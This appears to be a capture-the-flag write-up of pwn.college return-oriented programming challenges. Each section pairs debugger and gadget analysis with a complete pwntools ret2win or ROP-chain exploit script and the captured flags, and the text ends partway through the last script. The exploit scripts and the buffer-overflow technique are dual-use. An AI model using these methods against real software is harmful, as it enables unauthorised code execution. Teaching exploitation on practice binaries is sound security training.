---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/program-security/return-oriented-programming
---

## Loose Link (Easy)

```
hacker@return-oriented-programming~loose-link-easy:/$ /challenge/loose-link-easy 
###
### Welcome to /challenge/loose-link-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401d8e.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffee0096228, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

The solution to this challenge is a simple ret2win exploit as we used in [this](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#pies-easy) challenge.

Let's find the offset of `win()` within the program.

### Binary Analysis

#### `win()`

```
hacker@return-oriented-programming~loose-link-easy:/$ objdump -d -M intel /challenge/loose-link-easy | grep "<win>:"
0000000000401d8e <win>:
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x401d8e

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-easy': pid 38562
/home/hacker/script.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (513B)
[*] Process '/challenge/loose-link-easy' stopped with exit code -11 (SIGSEGV) (pid 38562)
[!!!] FLAG FOUND !!!

Received 80 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffd181688f8.
| 0x0000000000401d8e: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0x13fb] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{Y40hUq96Ina_w4qo4LYvtgBa4yR.0VM0MDL4ITM0EzW} 
```

&nbsp;

## Loose Link (Hard)

```
hacker@return-oriented-programming~loose-link-hard:/$ /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###
```

As expected, this level, gives us nothing.

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win()` within the program

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010d0  putchar@plt
0x00000000004010e0  __errno_location@plt
0x00000000004010f0  puts@plt
0x0000000000401100  write@plt
0x0000000000401110  printf@plt
0x0000000000401120  geteuid@plt
0x0000000000401130  read@plt
0x0000000000401140  setvbuf@plt
0x0000000000401150  open@plt
0x0000000000401160  strerror@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401256  bin_padding
0x00000000004018a6  win
0x00000000004019a3  challenge
0x00000000004019e2  main
0x0000000000401aa0  __libc_csu_init
0x0000000000401b10  __libc_csu_fini
0x0000000000401b18  _fini
```

Let's get the offset of `win()` first.

#### `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4018a6 in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004019a3 <+0>:     endbr64
   0x00000000004019a7 <+4>:     push   rbp
   0x00000000004019a8 <+5>:     mov    rbp,rsp
   0x00000000004019ab <+8>:     sub    rsp,0x40
   0x00000000004019af <+12>:    mov    DWORD PTR [rbp-0x24],edi
   0x00000000004019b2 <+15>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004019b6 <+19>:    mov    QWORD PTR [rbp-0x38],rdx
   0x00000000004019ba <+23>:    lea    rax,[rbp-0x20]
   0x00000000004019be <+27>:    mov    edx,0x1000
   0x00000000004019c3 <+32>:    mov    rsi,rax
   0x00000000004019c6 <+35>:    mov    edi,0x0
   0x00000000004019cb <+40>:    call   0x401130 <read@plt>
   0x00000000004019d0 <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004019d3 <+48>:    lea    rdi,[rip+0x732]        # 0x40210c
   0x00000000004019da <+55>:    call   0x4010f0 <puts@plt>
   0x00000000004019df <+60>:    nop
   0x00000000004019e0 <+61>:    leave
   0x00000000004019e1 <+62>:    ret
End of assembler dump.
```

We can see that a call to `read@plt` is made at `challenge+40`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x4019cb
```

```
pwndbg> run
Starting program: /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###


Breakpoint 1, 0x00000000004019cb in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 RBX  0x401aa0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 R8   0
 R9   0x2b
 R10  0x40057f ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x7ec61f7bfce0 (setvbuf) ◂— endbr64 
 R12  0x401170 (_start) ◂— endbr64 
 R13  0x7ffdb569aee0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffdb569adc0 —▸ 0x7ffdb569adf0 ◂— 0
 RSP  0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
 RIP  0x4019cb (challenge+40) ◂— call read@plt
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x4019cb <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
        nbytes: 0x1000
 
   0x4019d0 <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x4019d3 <challenge+48>    lea    rdi, [rip + 0x732]           RDI => 0x40210c ◂— 'Leaving!'
   0x4019da <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x4019df <challenge+60>    nop    
   0x4019e0 <challenge+61>    leave  
   0x4019e1 <challenge+62>    ret    
 
   0x4019e2 <main>            endbr64 
   0x4019e6 <main+4>          push   rbp
   0x4019e7 <main+5>          mov    rbp, rsp
   0x4019ea <main+8>          sub    rsp, 0x20
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
01:0008│-038     0x7ffdb569ad88 —▸ 0x7ffdb569aef8 —▸ 0x7ffdb569c693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-030     0x7ffdb569ad90 —▸ 0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
03:0018│-028     0x7ffdb569ad98 ◂— 0x11f7bfde5
04:0020│ rax rsi 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
05:0028│-018     0x7ffdb569ada8 —▸ 0x7ffdb569adf0 ◂— 0
06:0030│-010     0x7ffdb569adb0 —▸ 0x401170 (_start) ◂— endbr64 
07:0038│-008     0x7ffdb569adb8 —▸ 0x7ffdb569aee0 ◂— 1
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4019cb challenge+40
   1         0x401a87 main+165
   2   0x7ec61f75f083 __libc_start_main+243
   3         0x40119e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdb569add0:
 rip = 0x4019cb in challenge; saved rip = 0x401a87
 called by frame at 0x7ffdb569ae00
 Arglist at 0x7ffdb569adc0, args: 
 Locals at 0x7ffdb569adc0, Previous frame's sp is 0x7ffdb569add0
 Saved registers:
  rbp at 0x7ffdb569adc0, rip at 0x7ffdb569adc8
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [x] Location of return address to `main()`: `0x7ffdb569adc8`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x4018a6
buffer_addr = 0x7ffdb569ada0
addr_of_saved_ip = 0x7ffdb569adc8

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-hard': pid 5958
[+] Receiving all data: Done (148B)
[*] Process '/challenge/loose-link-hard' stopped with exit code -11 (SIGSEGV) (pid 5958)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/loose-link-hard!
###

Leaving!
You win! Here is your flag:
pwn.college{wMKUPEPkoVPhW8f3RHkBro9Nftw.0lM0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Easy)

```
hacker@return-oriented-programming~call-chain-easy:/$ /challenge/call-chain-easy 
###
### Welcome to /challenge/call-chain-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7fffa5868628, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

This time we have to call two functions: `win_stage_1` and `win_stage_2`.

### Binary Analysis

#### `win_stage_1`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_1>:"
0000000000401ffd <win_stage_1>:
```

#### `win_stage_2`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_2>:"
00000000004020aa <win_stage_2>:
```

If we overwrite the return address with the address of `win_stage_1` and place the address of `win_stage_2` after it, when the program returns from `win_stage_1`, it will execute `win_stage_2`, thus chaining our attack for us. 

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x401ffd
win_stage_2_offset = 0x4020aa

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-easy': pid 4197
/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (1.17KB)
[*] Process '/challenge/call-chain-easy' stopped with exit code -11 (SIGSEGV) (pid 4197)
[!!!] FLAG FOUND !!!

Received 88 bytes! This is potentially 2 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 3 gadgets of ROP chain at 0x7ffd95ca9c08.
| 0x0000000000401ffd: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x117a] ; mov eax, 0 ; call 0x401210 ; 
| 0x00000000004020aa: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x10cd] ; mov eax, 0 ; call 0x401210 ; 
| 0x00007ffd95ca9d38: xchg edi, eax ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; mov al, 0xa9 ; retf 0xfd95 ; jg 0x7ffd95ca9d47 ; add ah, al ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; loopne 0x7ffd95ca9cfb ; retf 0xfd95 ; jg 0x7ffd95ca9d57 ; add byte ptr [rip - 0x26a3556], dl ; jg 0x7ffd95ca9d5f ; add byte ptr [rax - 0x26a3556], dh ; jg 0x7ffd95ca9d67 ; add byte ptr [rsi - 0x26a3556], dh ; jg 0x7ffd95ca9d6f ; add bl, dl ; stosb byte ptr [rdi], al ; retf 0xfd95 ; jg 0x7ffd95ca9d77 ; 

Leaving!
pwn.college{cBWEQcy5TduarDbN4Kk3_8Qyq80.01M0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Hard)

```
hacker@return-oriented-programming~call-chain-hard:/$ /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###
```

Let's check which functions the program has.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  write@plt
0x00000000004010f0  printf@plt
0x0000000000401100  lseek@plt
0x0000000000401110  close@plt
0x0000000000401120  read@plt
0x0000000000401130  setvbuf@plt
0x0000000000401140  open@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  bin_padding
0x000000000040223e  win_stage_1
0x00000000004022eb  win_stage_2
0x000000000040239c  challenge
0x00000000004023e7  main
0x00000000004024a0  __libc_csu_init
0x0000000000402510  __libc_csu_fini
0x0000000000402518  _fini
```

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Offset of instruction in `win_stage_2()` within the program

Let's first get the offsets of the `win_stage_*()` functions.

#### `win_stage_1()`

```
pwndbg> info address win_stage_1
Symbol "win_stage_1" is at 0x40223e in a file compiled without debugging.
```

#### `win_stage_2()`

```
pwndbg> info address win_stage_2
Symbol "win_stage_2" is at 0x4022eb in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040239c <+0>:     endbr64
   0x00000000004023a0 <+4>:     push   rbp
   0x00000000004023a1 <+5>:     mov    rbp,rsp
   0x00000000004023a4 <+8>:     sub    rsp,0xa0
   0x00000000004023ab <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x00000000004023b1 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x00000000004023b8 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x00000000004023bf <+35>:    lea    rax,[rbp-0x80]
   0x00000000004023c3 <+39>:    mov    edx,0x1000
   0x00000000004023c8 <+44>:    mov    rsi,rax
   0x00000000004023cb <+47>:    mov    edi,0x0
   0x00000000004023d0 <+52>:    call   0x401120 <read@plt>
   0x00000000004023d5 <+57>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004023d8 <+60>:    lea    rdi,[rip+0xc2b]        # 0x40300a
   0x00000000004023df <+67>:    call   0x4010d0 <puts@plt>
   0x00000000004023e4 <+72>:    nop
   0x00000000004023e5 <+73>:    leave
   0x00000000004023e6 <+74>:    ret
End of assembler dump.
```

A the call to `read@plt` is made at `challenge+52`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+52)
Breakpoint 1 at 0x4023d0
```

```
pwndbg> run
Starting program: /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 RBX  0x4024a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x2b
 R10  0xfffffffffffff58f
 R11  0x715c4786dce0 (setvbuf) ◂— endbr64 
 R12  0x401150 (_start) ◂— endbr64 
 R13  0x7fff0ca867a0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff0ca86680 —▸ 0x7fff0ca866b0 ◂— 0
 RSP  0x7fff0ca865e0 ◂— 0
 RIP  0x4023d0 (challenge+52) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
 ► 0x4023d0 <challenge+52>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x4023d5 <challenge+57>    mov    dword ptr [rbp - 4], eax
   0x4023d8 <challenge+60>    lea    rdi, [rip + 0xc2b]           RDI => 0x40300a ◂— 'Leaving!'
   0x4023df <challenge+67>    call   puts@plt                    <puts@plt>
 
   0x4023e4 <challenge+72>    nop    
   0x4023e5 <challenge+73>    leave  
   0x4023e6 <challenge+74>    ret    
 
   0x4023e7 <main>            endbr64 
   0x4023eb <main+4>          push   rbp
   0x4023ec <main+5>          mov    rbp, rsp
   0x4023ef <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff0ca865e0 ◂— 0
01:0008│-098     0x7fff0ca865e8 —▸ 0x7fff0ca867b8 —▸ 0x7fff0ca87693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7fff0ca865f0 —▸ 0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
03:0018│-088     0x7fff0ca865f8 ◂— 0x1479d6723
04:0020│ rax rsi 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
05:0028│-078     0x7fff0ca86608 —▸ 0x715c479dc540 ◂— 0x715c479dc540
06:0030│-070     0x7fff0ca86610 ◂— 0
07:0038│-068     0x7fff0ca86618 —▸ 0x715c4787b5dd (_IO_default_setbuf+253) ◂— mov edx, dword ptr [rbx]
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4023d0 challenge+52
   1         0x40248c main+165
   2   0x715c4780d083 __libc_start_main+243
   3         0x40117e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff0ca86600`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

```
pwndbg> info frame
Stack level 0, frame at 0x7fff0ca86690:
 rip = 0x4023d0 in challenge; saved rip = 0x40248c
 called by frame at 0x7fff0ca866c0
 Arglist at 0x7fff0ca86680, args: 
 Locals at 0x7fff0ca86680, Previous frame's sp is 0x7fff0ca86690
 Saved registers:
  rbp at 0x7fff0ca86680, rip at 0x7fff0ca86688
```

- [x] Location of buffer: `0x7fff0ca86600`
- [x] Location of return address to `main()`: `0x7fff0ca86688`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x40223e
win_stage_2_offset = 0x4022eb
buffer_addr = 0x7fff0ca86600
addr_of_saved_ip = 0x7fff0ca86688

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-hard': pid 12207
[+] Receiving all data: Done (118B)
[*] Process '/challenge/call-chain-hard' stopped with exit code -11 (SIGSEGV) (pid 12207)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/call-chain-hard!
###

Leaving!
pwn.college{kUbPQlmZDS13sRzrmbin50xWwe_.0FN0MDL4ITM0EzW}
```

&nbsp;

## Chain of Command (Easy)

```
hacker@return-oriented-programming~chain-of-command-easy:/$ /challenge/chain-of-command-easy 
###
### Welcome to /challenge/chain-of-command-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffcd79c2e68, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (101 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

This time we have to pass arguments to the `win_stage_*()` functions. In x86-64, the first argument goes inside the `rdi` register.
Therefore, we will have to use a `pop rdi ; ret` gadget to load the arguments.

All in all, we need the following to craft the exploit:

- [ ] Offset of instruction in `win_stage_1()` within the program 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Offset of `pop rdi ; ret` gadget within the program

### Binary analysis

Let's first get the offsets of all the `win_stage_*()` functions.

#### `win_stage_1()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_1>:"
00000000004028ba <win_stage_1>:
```

#### `win_stage_2()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_2>:"
0000000000402615 <win_stage_2>:
```

#### `win_stage_3()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_3>:"
00000000004026f5 <win_stage_3>:
```

#### `win_stage_4()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_4>:"
000000000040252f <win_stage_4>:
```

#### `win_stage_5()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_5>:"
00000000004027d7 <win_stage_5>:
```

- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `pop rdi ; ret` gadget

Now, we have to find the address of the ROP gadget.

```
hacker@return-oriented-programming~chain-of-command-easy:/$ ROPgadget --binary /challenge/chain-of-command-easy | grep "pop rdi ; ret"
0x0000000000402ca3 : pop rdi ; ret
```

- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
- [x] Offset of `pop rdi ; ret` gadget within the program: `0x402ca3`

### ROP chain

- First we have to replace the return address with the address of the `pop rdi ; ret` gadget so that it is executed when `challenge()` returns.
- Then we have to chain it with `p64(1)`, the relevant argument for on the `win_stage_1()` function so that it gets popped into the `rdi` register.
- Finally we chain it with the address of the `win_stage_1@plt` call.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
rsp --> return address ==> │  00 00 00 00 00 40 2c a3  │ --> ( pop rdi ; ret )
			   │  00 00 00 00 00 00 00 01  │ ( 1 )
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
	// Pop the value pointed to by rsp into rip and move rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
         	   rsp --> │  00 00 00 00 00 00 00 01  │ ( 1 )
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() ) 
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x01

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
	// Pop the address of win_stage_1() pointed to by rsp into rip and move rsp
        // by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  .. .. .. .. .. .. .. ..  │ 
			   └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x01

═══════════════════════════════════════════════════════════════════════════════════
rip --> win_stage_1()
	// Call win_stage_1() with the argument that is stored in the rdi register.
═══════════════════════════════════════════════════════════════════════════════════
```

This is to be repeated for all the `win_stage_*()` functions.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x4028ba
win_stage_1_arg = 1
win_stage_2_offset = 0x402615
win_stage_2_arg = 2
win_stage_3_offset = 0x4026f5
win_stage_3_arg = 3
win_stage_4_offset = 0x40252f
win_stage_4_arg = 4
win_stage_5_offset = 0x4027d7
win_stage_5_arg = 5

# Calculate offset
offset = 120

# Gadget address found
pop_rdi_ret = 0x402ca3

# Base offset to reach the return address
payload = b"A" * offset

# Stage 1: win_stage_1(1)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(win_stage_1_offset)

# Stage 2: win_stage_2(2)
payload += p64(pop_rdi_ret)
payload += p64(2)
payload += p64(win_stage_2_offset)

# Stage 3: win_stage_3(3)
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(win_stage_3_offset)

# Stage 4: win_stage_4(4)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(win_stage_4_offset)

# Stage 5: win_stage_5(5)
payload += p64(pop_rdi_ret)
payload += p64(5)
